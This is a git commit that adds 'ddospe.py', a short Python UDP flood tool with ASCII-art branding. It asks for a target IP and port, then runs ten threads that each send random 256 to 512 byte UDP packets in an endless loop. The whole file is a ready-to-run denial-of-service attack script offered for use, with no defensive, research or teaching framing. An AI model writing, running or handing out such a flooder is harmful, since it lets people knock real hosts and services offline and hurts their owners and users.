903398d6bb7adbb0032d140681fba27f3bf3141f
pl4y3rmcpe999 <3234omer3234@gmail.com>
2026-01-16 23:19:16 +0300

    Ddos
    Ddos

---
+++ ddospe.py
@@ -0,0 +1,44 @@
+import socket
+import time
+import os
+import random
+import threading
+
+# Coded By @lolokooPE
+# Attack
+def attack(ip, port):
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  while True:
+    len = random.randint(256, 512)
+    payload = os.urandom(len)
+    s.sendto(payload, (ip, port))
+# Menu
+
+art = r"""
+
+
+████▄  ████▄   ▄▄▄  ▄█████ █████▄ ██████
+██  ██ ██  ██ ██▀██ ▀▀▀▄▄▄ ██▄▄█▀ ██▄▄
+████▀  ████▀  ▀███▀ █████▀ ██     ██▄▄▄▄
+
+"""
+os.system("clear")
+print("\033[31m" + art)
+print("By: @lolokooPE")
+print(" ")
+time.sleep(1)
+ip = input("IP: ")
+port = int(input("PORT: "))
+time.sleep(3)
+print(" ")
+os.system("clear")
+print(art)
+print(" ")
+print(f"Attacking To {ip} {port}")
+# Start Attack
+
+for i in range(10):
+  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
+  t.start()
+while True:
+  time.sleep(1)
